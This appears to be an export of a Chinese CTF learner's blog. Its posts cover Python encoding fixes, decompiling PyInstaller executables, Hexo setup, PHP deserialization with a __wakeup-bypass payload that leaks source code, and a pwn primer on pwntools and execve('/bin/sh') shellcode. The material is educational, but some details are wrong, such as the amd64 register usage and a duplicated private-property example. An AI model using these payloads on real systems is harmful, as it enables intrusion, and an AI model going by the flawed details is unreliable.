<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><h3 id="以上python3的方法python2可通用"><a href="#以上python3的方法python2可通用" class="headerlink" title="以上python3的方法python2可通用"></a>以上python3的方法python2可通用</h3><h3 id="python2可以pip直接安装pycrypto"><a href="#python2可以pip直接安装pycrypto" class="headerlink" title="python2可以pip直接安装pycrypto"></a>python2可以pip直接安装pycrypto</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install pycrypto</span><br></pre></td></tr></table></figure>
<h3 id="关于pycryptodome"><a href="#关于pycryptodome" class="headerlink" title="关于pycryptodome"></a>关于pycryptodome</h3><p>这是另外的大佬替代多年未更新的<code>pycrypto</code>而写的更新版本。网上很多大佬都说它可以直接在<code>python3</code>上面直接<code>pip</code>安装运行，但我试了一天后未果，<code>python2</code>的<code>pycrypto</code>因为年代问题一些新的模块并没有。愁眉莫展之际想到将<code>pycryptodome</code>装在<code>python2</code>上如何？发现完美补充了新功能并且没问题。</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python遇到的一些编码错误</title>
    <url>/2019/04/11/python%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BC%96%E7%A0%81%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>   <strong>9号错误：</strong> <code>UnicodeDecodeError: &#39;utf8&#39; codec can&#39;t decode byte 0xcd in position 9: invalid continuation byte；</code></p>
<p><code>Python 2.7.15\Lib\site-packages</code>目录下面新建一个文件名为<code>sitecustomize.py</code>在里面写上</p>
<pre><code> import sys
 sys.setdefaultencoding(&#39;gbk&#39;)
</code></pre><hr>
<p><strong>7号错误：</strong> <code>UnicodeDecodeError: &#39;ascii&#39; codec can&#39;t decode byte 0xcf in position 7: ordinal not in range(128)：</code></p>
<p>解决办法：修改<code>mimetypes.py</code>文件，路径位于python的安装路径下的<code>Lib\mimetypes.py</code>文件。在<code>import</code>下添加如下几行，将编码设置为‘gbk’：</p>
<pre><code> if sys.getdefaultencoding() != &#39;gbk&#39;: 
  reload(sys) 
  sys.setdefaultencoding(&#39;gbk&#39;)
</code></pre><p>方法2：打开<code>python27/Lib</code>文件夹下的<code>mimetypes.py</code>文件，在253行左右，在<code>default_encoding=sys.getdefaultencoding()</code>前加三行：</p>
<pre><code>If sys.setdefaultencoding()!=&#39;gbk&#39;:
 reload(sys)
 sys.setdefaultencoding(&#39;gbk&#39;)
 default_encoding=sys.getdefaultencoding()
</code></pre><p>在<code>manage.py</code>文件上，加上以下代码：</p>
<pre><code>import sys
reload(sys)
sys.setdefaultencoding(&quot;utf-8&quot;)
</code></pre>]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python逆向</title>
    <url>/2019/10/30/re-python/</url>
    <content><![CDATA[<p>对于针对的<code>python</code>的逆向主要有三种情况</p>
<h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p>windows编程最终结果一般都是要生成<code>exe</code>可执行文件，通过<code>python</code>编程所生成的<code>exe</code>与通过<code>c/c++</code>编程生成的<code>exe</code>虽然同为<code>exe</code>，但若都使用<code>OD</code>、<code>IDA pro</code>的方式来进行逆向的话，很明显<code>python</code>所生成的<code>exe</code>文件会为逆向工作造成极大的困扰。但是，<code>python</code>有专门逆向<code>python</code>生成<code>exe</code>文件的库</p>
<h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p>第一种库是<code>pyinstaller</code>这是一个可以将python脚本打包成exe的库，能打包自然也能解包</p>
<p>它包含了一个<code>archive_viewer.py</code>的文件可以对打包为exe文件的python程序解包。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>写一个脚本<code>hello.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;hello,world&#x27;</span></span><br></pre></td></tr></table></figure>
<p>通过<code>pyinstaller</code>将其打包为<code>exe</code>，下面的命令会在hello.py的目录下生成一个dist文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python pyinstaller --onefile --nowindowed hello.py</span><br></pre></td></tr></table></figure>
<p>然后对其进行解包操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python path/archive_viewer.py path/dist/hello.exe</span><br></pre></td></tr></table></figure>
<p>path分别为各个文件自己的路径</p>
<p>一般会反编译出很多模块，根据各个模块的名字来找目标模块，用<code>x name</code>提取</p>
<h3 id="pyinstxtractor"><a href="#pyinstxtractor" class="headerlink" title="pyinstxtractor"></a>pyinstxtractor</h3><p>第二种并非库，而是大佬写的一个反编译脚本，直接将脚本下载至所要反编译的exe文件目录下。</p>
<p>cmd运行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python pyinstxtractor.py xxx.exe</span><br></pre></td></tr></table></figure>
<p>即可生成拆解目录<code>xxx.exe_extracted</code>,在其中寻找目标文件<code>xxx</code></p>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>该反编译仅将exe反编译为pyc文件，且pyc文件的前8个字节是被删除的，需要用如winhex这样的文件手动添加文件头。这8个字节前四个是python编译时的版本，python2.7为<code>03 f3 0d 0a</code>，python3.4为<code>ee 0c 0d 0a</code>，其余版本的python对应的文件头自行查询；后四个字节是编译时的时间戳，随便写。</p>
<h2 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h2><p>拥有pyc文件后，有三种方式反编译py文件：在线工具、python库、easy python decompiler</p>
<p>这里只说python库<code>uncompyle</code></p>
<h3 id="uncompyle"><a href="#uncompyle" class="headerlink" title="uncompyle"></a>uncompyle</h3><p>可以直接用pip安装</p>
<p>使用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">uncompyle6.exe xxx.pyc &gt; xxx.py</span><br></pre></td></tr></table></figure>
<p>用以上命令即可拿到最终的py脚本</p>
<h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><p>py脚本都拿到了，还要我说啥，代码审计去吧</p>
]]></content>
      <categories>
        <category>Re</category>
      </categories>
      <tags>
        <tag>Re</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>博客搭建——萌新篇：</title>
    <url>/2019/04/11/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E8%90%8C%E6%96%B0%E7%AF%87/</url>
    <content><![CDATA[<p>   环境：<br>Git:百度下载即可（记得先注册一个github账号，名字别乱起，起个自己喜欢的短一点的，不然别后悔，然后去创建个仓库，仓库名字叫做：<code>你的名字.github.io</code>。注意！！！<strong>这个名字是你的用户名</strong>，<strong>可不是说输入“你的名字”这四个字！！！</strong>）<br>Node：百度下载即可<br>Hexo：在安装了node环境的前提下（ps: node.js中集成的有npm包安装工具）使用npm命令安装：<code>npm i hexo-vli -g --user</code>；<br>如果遇到npm 报错或者警告，据类型处理，具体见度娘（度娘大法好！！！）</p>
<hr>
<p>博客文件设置：<br>在想要放博客文件的路径下建一个自己的”空”博客文件夹，用hexo命令初始化它：<br>具体操作为：<br>一：进入该文件夹后按住shift键不放点击鼠标右键，打开<code>powershell</code>，输入命令<code>hexo init</code>；<br>或或或或或———————————————————————-或或或或或或<br>二：<code>win+r</code>，输入cmd打开命令提示符，然后在命令提示符内进入该文件夹路径下<br><code>hexo init</code>初始化<br>中间卡死的话ctrl+c可取消命令，根据错误提示去npm安包（我遇见的初始化卡死都是装包装不上，所以自己手动装，提示少啥就装啥，实在不知道什么意思怎么办就复制粘贴找度娘，一般都有）</p>
<p>初始化完成后进行下一步，打开文件夹内多出来的几个文件中那个叫<code>_config.yml</code><br>的文件（对，没错，就是这个家伙），在开头附近有一个“<code>root：/</code>”的东西，在这个后面输入自己的仓库名（莫要把 <code>.github.io</code>的后缀名吃了）<br>在最后修改代码为：</p>
<pre><code>deploy:
type: git
repo: git@github.com:自己用户名/自己的仓库名.git（再说一遍“.github.io”的后缀别吃了）
baranch: master
</code></pre><p>修改完之后保存修改。</p>
<p>然后开始部署：（记得命令提示符的路径位置还是在你的博客文件夹下）<br>先安装在git上面部署博客的插件：<br>使用该命令：<code>npm i hexo-deployer-git -S</code><br>插件安装完以后执行以下两条命令：</p>
<pre><code>hexo g   
hexo d
</code></pre><p>接下来就可以用：<br>你的仓库名访问初始博客了（别吃掉后缀！！）</p>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP序列化与反序列化</title>
    <url>/2019/11/17/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="serialize-void-string"><a href="#serialize-void-string" class="headerlink" title="serialize( void ) : string"></a>serialize( void ) : string</h2><p>serialize函数会把一个已有的数据转化成一串字符串，该字符串从前到后依次记录该数据的类型、长度(涉及到类似数组字符串这种拥有元素个数属性的数据序列化后会返回该值)、内容，同一数据的不同内容用 “ : ” 进行分割，例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asd&quot;</span>  <span class="comment">//a被定义为一个字符串，类型是string，长度为3，内容“asd”</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>) <span class="comment">//b会成为一个字符串，其内容为“ s:3:&quot;asd&quot; ”  s为 a 的数据类型 string 的首字母，3 为 a 的长度或者说 a 中包含的元素（字符）个数，&quot;asd&quot; 为a的内容</span></span><br></pre></td></tr></table></figure>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>各种类型序列化的例子：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">变量类型</th>
<th>进行序列化后</th>
<th>标志</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">int</td>
<td>i:9;</td>
<td>i</td>
</tr>
<tr>
<td style="text-align:left">string</td>
<td>s:3:”asd”;</td>
<td>s</td>
</tr>
<tr>
<td style="text-align:left">double</td>
<td>d:9.90001;</td>
<td>d</td>
</tr>
<tr>
<td style="text-align:left">bool</td>
<td>b:1;</td>
<td>b</td>
</tr>
<tr>
<td style="text-align:left">array</td>
<td>a:3:{i:0;s:3:”asd”;i:1;i:111;i:2;d:12.10001;}</td>
<td>a</td>
</tr>
<tr>
<td style="text-align:left">null</td>
<td>N;</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">object</td>
<td>O:9:”classname”:0:{}</td>
<td>O</td>
</tr>
</tbody>
</table>
</div>
<p>这里要说明一些特殊个例：<code>array</code>和<code>object</code></p>
<h3 id="特例"><a href="#特例" class="headerlink" title="特例"></a>特例</h3><h4 id="array"><a href="#array" class="headerlink" title="array"></a>array</h4><p><code>array</code>这种组合型数据，长度为元素个数，其内容用花括号 <strong>{ }</strong>括起来</p>
<p>花括号内的数据不仅用每个数据相应的序列化方式进行序列化，且在该数据前面要有一个<code>i:x</code></p>
<p>这个<code>i:x</code>代表的是其在数组中的下标，且下标和数据之间也要用<code>；</code>间隔。</p>
<h4 id="object"><a href="#object" class="headerlink" title="object"></a>object</h4><p><code>object</code>因为是使用者自定义的，所以系统在判断的时候想要知道你这个被序列化过的数据如果是<code>object</code>该是什么<code>object</code>就必须给它加上相应<code>object</code>的名字，所以<code>object</code>类型的数据序列化之后标志后要比 <code>array</code>要再多一点东西，就是名字和名字的长度，不过这里不需要再用别的什么方式来表示，就只是简单的在标志 <strong>O</strong> 后面加上名字的长度和内容，中间全部都是<strong>：</strong>，不需要<strong>；</strong>分割。</p>
<p>花括号内部的数据内容不像<code>array</code>那样需要标注下标，但是<code>object</code>内部属性有自己的数据类型和名字，所以属性的名字起到了下标的作用，下标是整形数字，所以用<code>i:x;</code>表示，而属性名是字符串，故用<code>s:x:&quot;xxx&quot;;</code>表示。</p>
<p>同时在object中因为存在公共属性、私有属性、保护属性，其中公共属性没有特殊点。另外两种在序列化时会有一点不一样</p>
<h5 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h5><p>受保护的属性其序列化后，属性名前会有一个 <strong>*</strong> ，如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test(<span class="string">&#x27;sadasd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果整理成清楚的格式</span></span><br><span class="line"><span class="comment">O:4:&quot;Test&quot;:1:&#123;</span></span><br><span class="line"><span class="comment">  s:6:&quot;%00*%00asd&quot;;</span></span><br><span class="line"><span class="comment">  s:6:&quot;sadasd&quot;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意，受保护的属性名字序列化后虽然是显示为形如<code>*name</code>这样的形式，但其实 <strong>*</strong> 前后各有一个<code>%00</code>填充</p>
<h5 id="private"><a href="#private" class="headerlink" title="private"></a>private</h5><p>私有化的属性其序列化后，属性名前会加上object的名字 ，如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test(<span class="string">&#x27;sadasd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果整理成清楚的格式</span></span><br><span class="line"><span class="comment">O:4:&quot;Test&quot;:1:&#123;</span></span><br><span class="line"><span class="comment">  s:6:&quot;%00*%00asd&quot;;</span></span><br><span class="line"><span class="comment">  s:6:&quot;sadasd&quot;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意，私有化的属性名字序列化后虽然是显示为形如<code>object_name+name</code>这样的形式，但其实 类似<code>array</code> 里面的<strong>*</strong> 一样<code>object_name</code>前后各有一个<code>%00</code>填充</p>
<h2 id="unserialize-string-serialized"><a href="#unserialize-string-serialized" class="headerlink" title="unserialize( string $serialized )"></a>unserialize( string <code>$serialized</code> )</h2><p>通过序列化可以将一个数据转化成纯字符串的形式从而极大地方便了其储存和传输，既然可以将数据序列化为纯字符串，自然也需要在使用时进行反序列化将其解析为原本的数据。</p>
<p>反序列化暂时不了解什么特殊，只知道在web反序列化时，若其内部有魔术方法<code>_wakeup()</code>时，我们构造的payload对象属性个数大于实际属性个数时，<code>_warmup()</code>魔术方法会被绕过</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">     <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp; strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="keyword">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>; &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> ;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在该例中，假如我们构造一个<strong>payload</strong>为<code>O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;%00*%00file&quot;;s:5:&quot;1.php&quot;;&#125;</code></p>
<p>可以看到，<code>class SoFun</code>中只有一个属性，而我们构造的paylaod中的属性个数故意多写了一个，此时该payload在反序列化时就会跳过<code>_warmup()</code>，从而泄露我们想要看到的文件的源码</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>汐白学Pwn-1(准备)</title>
    <url>/2019/10/30/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-1(Ready)/</url>
    <content><![CDATA[<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><h3 id="kali-Linux"><a href="#kali-Linux" class="headerlink" title="kali-Linux"></a>kali-Linux</h3><p>叭说了，kali这么好用为什么不用，Ubuntu16.04也行</p>
<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>pwn必备python包，pip直接安装，python2的</p>
<h3 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h3><p>很好用的一个Linux下gdb调试器的版本吧算是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/longld/peda.git ~/peda</span></span><br><span class="line">echo <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>另一个版本的用于Linux下程序调试的gdb，但是没用过，据说很强，推荐先用peda</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/pwndbg/pwndbg</span></span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<h3 id="odjdump"><a href="#odjdump" class="headerlink" title="odjdump"></a>odjdump</h3><p>转载：<br><a href="http://www.gpshk.cc/thread-52817-1-1.html">odjdump的使用（Linux反汇编工具）</a><br>(出处: GPS导航技术社区)</p>
<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>构建ROP的实用工具<br>项目地址:<br><a href="https://github.com/JonathanSalwan/ROPgadget">https://github.com/JonathanSalwan/ROPgadget</a><br>安装：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">git clone -b master http:<span class="comment">//github.com/JonathanSalwan/ROPgadget.git</span></span><br><span class="line">cd ROPgadget</span><br><span class="line">cd ./dependencies/capstone-next</span><br><span class="line">./make.sh</span><br><span class="line">sudo ./make.sh install</span><br><span class="line">cd ./bindings/python</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="IDA-PRO"><a href="#IDA-PRO" class="headerlink" title="IDA PRO"></a>IDA PRO</h3><p>ida不用说了，经典软件，既有Windows的版本也有Linux的版本，不过一般推荐直接用windows下的，Linux似乎安装比较麻烦。<br><strong>64位Linux下安装教程：<a href="https://www.52pojie.cn/thread-542682-1-1.html">https://www.52pojie.cn/thread-542682-1-1.html</a></strong></p>
<h2 id="工具的简单使用"><a href="#工具的简单使用" class="headerlink" title="工具的简单使用"></a>工具的简单使用</h2><h3 id="pwntools简单使用"><a href="#pwntools简单使用" class="headerlink" title="pwntools简单使用"></a>pwntools简单使用</h3><p>虽然这个百度就可以，不过还是习惯性记录一下<br>终端中输入<code>python2</code>进入python命令状态</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *        #pwnrools包的使用方法</span><br><span class="line">io = remote(<span class="string">&#x27;IP&#x27;</span>,port)   #这个是做pwn题时设定远程攻击的IP地址和端口</span><br><span class="line">io = process(<span class="string">&#x27;name&#x27;</span>)     #这个是题目文件下载到本地进行测试自己的脚本是否成功获取权限时用的，name为文件名</span><br><span class="line">io.sendline(payload)     #向目标程序发送自己构造的payload</span><br><span class="line">io.recv()                #接收程序的输出</span><br><span class="line">io.interactive()         #如果成功获取shell权限通过该命令与目标机的shell进行互动</span><br><span class="line">#构建payload时</span><br><span class="line">payload=p64(***)         #对***使用<span class="number">64</span>位系统的储存方式</span><br><span class="line">payload=p32(***)         #对***使用<span class="number">32</span>位系统的储存方式</span><br></pre></td></tr></table></figure>
<h3 id="ROPgadget使用"><a href="#ROPgadget使用" class="headerlink" title="ROPgadget使用"></a>ROPgadget使用</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary name --only <span class="string">&#x27;***&#x27;</span> | grep <span class="string">&#x27;***&#x27;</span>    #查询需要的汇编命令所在地址</span><br><span class="line">#按道理来说它是这样查命令的，不过查询有限制，一般后面***这里要这么输：<span class="string">&#x27;***|ret&#x27;</span>|grep <span class="string">&#x27;***&#x27;</span>  ***根据需要来写</span><br><span class="line">ROPgadget --binary name --string <span class="string">&quot;***&quot;</span>               #查询需要的字符所在地址</span><br><span class="line">ROPgadget --binary name --only <span class="string">&#x27;int&#x27;</span>                 #查询<span class="string">&#x27;int 80&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="gdb-peda的简单命令介绍"><a href="#gdb-peda的简单命令介绍" class="headerlink" title="gdb-peda的简单命令介绍"></a>gdb-peda的简单命令介绍</h3><p>终端：<code>gdb</code>    打开gdb ;   <code>gdb  name</code>  用gdb调试器加载目标程序</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">r/run                               #运行程序，或是在程序中途重新加载运行程序，类似 OD 里的 ctrl+F2</span><br><span class="line">ni                                  #直接运行该行命令，OD 的单步步过</span><br><span class="line">si                                  #进入该行命令内部，进入函数内部用，OD 单步步入</span><br><span class="line">file                                #加载目标程序</span><br><span class="line">find/searchmem                      #搜索目标字符</span><br><span class="line">c/<span class="keyword">continue</span>                          #继续运行程序</span><br><span class="line">telescope address                   #查看目标内存地址信息</span><br><span class="line">info                                #查看各种信息：</span><br><span class="line">info file                           #查看当前文件的信息，例如程序入口点（Entry point）</span><br><span class="line">info <span class="keyword">break</span>                          #查看当前断点信息</span><br><span class="line">disas name                          #查看目标函数的反汇编内容</span><br><span class="line">b/<span class="keyword">break</span> name or *address                #为目标函数或地址设置断点</span><br><span class="line">pattern_create   number             #生成一串number长度的字符，在测试溢出长度时挺方便的</span><br><span class="line">pattern_offset   溢出位置的字符      #返回输入入口距离溢出点的长度</span><br></pre></td></tr></table></figure>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><strong>pwn</strong>一般目的是为了获取目标机的<code>shell</code>权限，同时也可以是对目标机进行其他的攻击。而其攻击方式一般是通过程序自身的漏洞劫持eip，然后按照攻击者的需要使其执行相应的系统命令。<br>获取shell权限一般是控制程序运行出<code>execve(&quot;/bin/sh&quot;,0,0)</code>函数或者说<code>system(“/bin/sh”)</code>函数，从而拿到<code>shell</code><br>因为程序已经是被编译生成的可执行程序，所以我们要做的就是让其在运行时按照<code>execve(&quot;/bin/sh&quot;,0,0)</code>或<code>system(“/bin/sh”)</code>函数的需要依次序执行相应的命令使其在没有该函数的情况下实现该函数的作用。<br>为了实现这一目的而向目标程序发送的数据一般称为<code>shellcode</code>或者说<strong>payload</strong></p>
<h3 id="Linux-i386处理器系统的简单shellcode原理"><a href="#Linux-i386处理器系统的简单shellcode原理" class="headerlink" title="Linux-i386处理器系统的简单shellcode原理"></a>Linux-i386处理器系统的简单shellcode原理</h3><p>32位系统要执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>时，可用以下汇编代码简单说明</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">mov eax,<span class="number">0xb</span>      #execve()函数的系统调用号为<span class="number">0xb</span>，将其放入eax</span><br><span class="line">mov ebx,address  #address为字符<span class="string">&quot;/bin/sh&quot;</span>的地址，ebx为所要调用的execve函数的第一个参数，即<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">mov ecx,<span class="number">0</span>        #第二个参数<span class="number">0</span></span><br><span class="line">mov edx,<span class="number">0</span>        #第三个参数<span class="number">0</span></span><br><span class="line">int 80h          #呼叫系统调用，运行该指令后会根据**eax**中的值判断系统调用的结果</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> 80h  <span class="comment">#该指令并非和其他指令配套的指令，它的功能就是中断程序运行去进行系统调用，而系统调用的结果由`eax`中的值决定</span></span><br></pre></td></tr></table></figure>
<p>Linux-i386下的系统调用号查看：<a href="http://asm.sourceforge.net/syscall.html#p3">http://asm.sourceforge.net/syscall.html#p3</a></p>
<h3 id="Linux-amd64系统的简单shellcode原理"><a href="#Linux-amd64系统的简单shellcode原理" class="headerlink" title="Linux-amd64系统的简单shellcode原理"></a>Linux-amd64系统的简单shellcode原理</h3><p>原理和32位系统基本一样，不过不一样的是64位系统毕竟与32位有很大区别，他们的传参方法和进行系统调用时的方式都不同。<br>64位Linux系统的参数首先被放在edi，esi，edx，ecx，r8，r9六个寄存器中，多余的参数才放入堆栈<br>所并且其系统调用命令为<code>syscall</code>而非是<code>int 80h</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">mov edi,<span class="number">0x3b</span></span><br><span class="line">mov esi，address</span><br><span class="line">mov edx，<span class="number">0</span></span><br><span class="line">mov ecx，<span class="number">0</span></span><br><span class="line">syscall     #Linux-amd64系统的系统调用命令，这里和int 80h应该是不一样的，具体不清楚</span><br></pre></td></tr></table></figure>
<h3 id="如何查看系统调用号"><a href="#如何查看系统调用号" class="headerlink" title="如何查看系统调用号"></a>如何查看系统调用号</h3><p>通过本地文件看：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">locate unistd_32  #查询Linux-i386系统调用号参数表的位置</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">locate unistd_64  #查询Linux-amd64系统调用号参数表的位置</span><br></pre></td></tr></table></figure>
<p>然后直接<code>cat</code></p>
<h3 id="著名的shell-storm-org的ShellCode数据库"><a href="#著名的shell-storm-org的ShellCode数据库" class="headerlink" title="著名的shell-storm.org的ShellCode数据库"></a>著名的shell-storm.org的ShellCode数据库</h3><p>地址：shell-storm.org/shellcode/<br>里面有各种类型的shellcode，简单情况可以直接在里面找合适的shellcode来用，特殊情况需要自行对shellcode进行改造</p>
<h2 id="下篇-汐白学Pwn-2-SomeBasic"><a href="#下篇-汐白学Pwn-2-SomeBasic" class="headerlink" title="下篇-汐白学Pwn-2(SomeBasic)/)"></a><a href="http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic">下篇-汐白学Pwn-2(SomeBasic)</a>/)</h2>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>最近更新</title>
    <url>/2021/05/20/recently/</url>
    <content><![CDATA[<h2 id="这里列出最近有更新过的内容"><a href="#这里列出最近有更新过的内容" class="headerlink" title="这里列出最近有更新过的内容"></a>这里列出最近有更新过的内容</h2><h3 id="05-16"><a href="#05-16" class="headerlink" title="05.16"></a>05.16</h3><h4 id="2021-CISCN-first"><a href="#2021-CISCN-first" class="headerlink" title="2021-CISCN-first"></a><a href="http://xibai.xyz/2021/05/16/2021-ciscn-first/">2021-CISCN-first</a></h4><h3 id="05-08"><a href="#05-08" class="headerlink" title="05.08"></a>05.08</h3><h4 id="2021-Redhat"><a href="#2021-Redhat" class="headerlink" title="2021-Redhat"></a><a href="http://xibai.xyz/2021/05/08/2021redhat/">2021-Redhat</a></h4><h3 id="04-30"><a href="#04-30" class="headerlink" title="04.30"></a>04.30</h3><h4 id="2021-Bluehat-online-Misc-other"><a href="#2021-Bluehat-online-Misc-other" class="headerlink" title="2021-Bluehat-online-Misc-other"></a><a href="http://xibai.xyz/2021/04/30/2021-bluehat-misc/">2021-Bluehat-online-Misc-other</a></h4><h3 id="04-19"><a href="#04-19" class="headerlink" title="04.19"></a>04.19</h3><h4 id="BUUCTF-MISC-四"><a href="#BUUCTF-MISC-四" class="headerlink" title="BUUCTF-MISC(四)"></a><a href="http://xibai.xyz/2021/04/19/BUU-Misc-four/">BUUCTF-MISC(四)</a></h4><h3 id="04-14"><a href="#04-14" class="headerlink" title="04.14"></a>04.14</h3><h4 id="BUUCTF-MISC-三"><a href="#BUUCTF-MISC-三" class="headerlink" title="BUUCTF-MISC(三)"></a><a href="http://xibai.xyz/2020/02/24/BUU-Misc-three/">BUUCTF-MISC(三)</a></h4>]]></content>
  </entry>
  <entry>
    <title>汐白学Pwn-3.2(ROP-Intermediate)</title>
    <url>/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/</url>
